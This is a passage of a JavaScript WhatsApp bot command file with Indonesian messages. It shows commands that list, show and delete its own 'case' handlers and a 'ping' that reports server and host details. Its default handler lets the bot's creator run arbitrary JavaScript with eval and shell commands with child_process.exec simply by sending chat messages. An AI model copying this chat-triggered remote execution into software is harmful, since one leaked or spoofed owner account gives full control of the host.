        const casePattern = new RegExp(`case ['"]${text}['"]:[\\s\\S]*?break`, 'g')
        if (!casePattern.test(data)) {
            return m.reply(`Case '${text}' tidak ditemukan`)
        }
        const newContent = data.replace(casePattern, '')
        fs.writeFile(namaFile, newContent, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err)
                return m.reply('Gagal menghapus case')
            }
            m.reply(`Case '${text}' berhasil dihapus`)
        })
    })
}
break

case "getcase": {
if (!isCreator) return m.reply(mess.owner)
if (!text) {
const code = fs.readFileSync('case.js', 'utf8');
const regex = /case\s+["'`](.+?)["'`]\s*:/g;
let match;
const cases = [];
while ((match = regex.exec(code)) !== null) {
  cases.push(match[1]);
}
const rows = []
cases.forEach((name, index) => rows.push({
title: `${name}`,
description: `Klik untuk melihat detail case ${name}`, 
id: `.getcase ${name}`
}))
return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Case',
          sections: [
            {
              title: `© Summer Ghost Version 3.0`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Case Yang Ingin Dilihat\nTotal Case: ${cases.length}\n`
}, { quoted: m })
}
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

case "listcase": {
if (!isCreator) return m.reply(mess.owner)
const code = fs.readFileSync('case.js', 'utf8');
const regex = /case\s+["'`](.+?)["'`]\s*:/g;
let match;
const cases = [];
while ((match = regex.exec(code)) !== null) {
  cases.push(match[1]);
}
return m.reply(`
*Total Case:* ${cases.length}

- ${cases.join("\n- ")}
`)
}
break

case "ping": {
    const os = require('os');
    const nou = require('node-os-utils');
    const speed = require('performance-now');

    try {
        const timestamp = speed();
        const tio = await nou.os.oos();
        const tot = await nou.drive.info();
        const memInfo = await nou.mem.info();
        const totalGB = (memInfo.totalMemMb / 1024).toFixed(2);
        const usedGB = (memInfo.usedMemMb / 1024).toFixed(2);
        const freeGB = (memInfo.freeMemMb / 1024).toFixed(2);
        const cpuCores = os.cpus().length;
        const vpsUptime = runtime(os.uptime());
        const botUptime = runtime(process.uptime());
        const latency = (speed() - timestamp).toFixed(4);

        const serverInfo = `
╭───⧁ *SERVER INFORMATION* ⧁───╮
┃
┃ 🖥️ *OS Platform*: ${nou.os.type()}
┃ 💾 *RAM Usage*: ${usedGB}/${totalGB} GB (${freeGB} GB free)
┃ 🗄️ *Disk Space*: ${tot.usedGb}/${tot.totalGb} GB used
┃ 🔢 *CPU Cores*: ${cpuCores} Core(s)
┃ ⏱️ *VPS Uptime*: ${vpsUptime}
┃
╰───⧁ *BOT INFORMATION* ⧁───╯
┃
┃ ⚡ *Response Time*: ${latency} sec
┃ 🔋 *Bot Uptime*: ${botUptime}
┃ 🧠 *CPU Model*: ${os.cpus()[0].model}
┃ 🏷️ *Architecture*: ${os.arch()}
┃ 🏠 *Hostname*: ${os.hostname()}
┃
╰─⧁━━━━━━━━━━━━━━━━━━━━━━━━━━⧁─╯
        `;

        await client.sendMessage(m.chat, {
            text: serverInfo,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 999
            }
        }, { quoted: m });

    } catch (err) {
        console.error("Error in ping command:", err);
        m.reply("❌ Gagal mengambil informasi server. Cek logs untuk detail.");
    }
}
break

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})